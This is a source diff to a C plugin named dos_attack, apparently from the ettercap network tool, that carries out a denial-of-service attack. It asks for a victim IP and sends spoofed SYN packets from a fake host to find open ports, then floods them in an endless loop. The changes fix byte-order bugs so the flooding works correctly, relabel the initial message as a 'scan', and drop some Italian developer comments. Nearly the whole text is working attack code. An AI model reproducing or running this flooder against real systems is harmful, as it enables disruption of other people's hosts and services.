@@ -17,7 +17,7 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Id: dos_attack.c,v 1.3 2004/02/03 12:19:11 lordnaga Exp $
+    $Id: dos_attack.c,v 1.4 2004/02/03 15:13:50 lordnaga Exp $
 */
 
 
@@ -76,8 +76,8 @@ int plugin_load(void *handle)
 static int dos_attack_init(void *dummy) 
 {
    struct in_addr ipaddr;   
-   char dos_addr[MAX_ASCII_ADDR_LEN+2];
-   char unused_addr[MAX_ASCII_ADDR_LEN+2];
+   char dos_addr[MAX_ASCII_ADDR_LEN];
+   char unused_addr[MAX_ASCII_ADDR_LEN];
    struct port_list *p;
          
    /* It doesn't work if unoffensive */
@@ -90,8 +90,6 @@ static int dos_attack_init(void *dummy)
    GBL_OPTIONS->quiet = 1;
 
    ui_input("Insert victim IP: ", dos_addr, sizeof(dos_addr));
-   // XXX - E PER LO \r o \n??????????????? -------------------------------
-   // OCCHIO ANCHE PER GRE RELAY (stessa cosa)
    if (inet_aton(dos_addr, &ipaddr) == 0) {
       INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
       return PLUGIN_FINISHED;
@@ -105,7 +103,7 @@ static int dos_attack_init(void *dummy)
    }
    ip_addr_init(&fake_host, AF_INET, (char *)&ipaddr);
 
-   INSTANT_USER_MSG("dos_attack: Starting D.O.S. attack against %s [Fake Host: %s]\n", dos_addr, unused_addr);
+   INSTANT_USER_MSG("dos_attack: Starting scan against %s [Fake Host: %s]\n", dos_addr, unused_addr);
 
    /* Delete the "open" port list just in case of previous executions */
    while (!SLIST_EMPTY(&port_table)) {
@@ -119,11 +117,10 @@ static int dos_attack_init(void *dummy)
 
    /* Add the hook for SYN-ACK reply */
    hook_add(HOOK_PACKET_TCP, &parse_tcp);
-         
+
    /* create the flooding thread */
    ec_thread_new("golem", "SYN flooder thread", &syn_flooder, NULL);
 
-   // XXX - GBL_OPTIONS->quiet deve rimanere cosi'???? --------------        
    return PLUGIN_RUNNING;
 }
 
@@ -161,10 +158,12 @@ EC_THREAD_FUNC(syn_flooder)
  
    /* First "scan" ports from 1 to 1024 */
    for (dport=1; dport<1024; dport++) {
-      send_tcp(&fake_host, &victim_host, sport++, dport, seq++, 0, TH_SYN);
+      send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN);
       usleep(1000);
    }
 
+   INSTANT_USER_MSG("dos_attack: Starting attack...\n");
+   
    /* Continue flooding open ports */
    LOOP {
       CANCELLATION_POINT();
@@ -198,7 +197,7 @@ static void parse_tcp(struct packet_object *po)
           return;
 	  
    /* Complete the handshake with an ACK */
-   send_tcp(&fake_host, &victim_host, po->L4.dst, po->L4.src, po->L4.ack, po->L4.seq + 1, TH_ACK);
+   send_tcp(&fake_host, &victim_host, po->L4.dst, po->L4.src, po->L4.ack, htonl( ntohl(po->L4.seq) + 1), TH_ACK);
    
    /* Check if the port is already in the "open" list... */
    SLIST_FOREACH(p, &port_table, next) 
@@ -210,8 +209,7 @@ static void parse_tcp(struct packet_object *po)
    p->port = po->L4.src;
    SLIST_INSERT_HEAD(&port_table, p, next);
    
-   // XXX - Per test (lo lascio???)
-   INSTANT_USER_MSG("dos_attack: Port %d added\n", p->port);
+   INSTANT_USER_MSG("dos_attack: Port %d added\n", ntohs(p->port));
 }
 
 /* EOF */
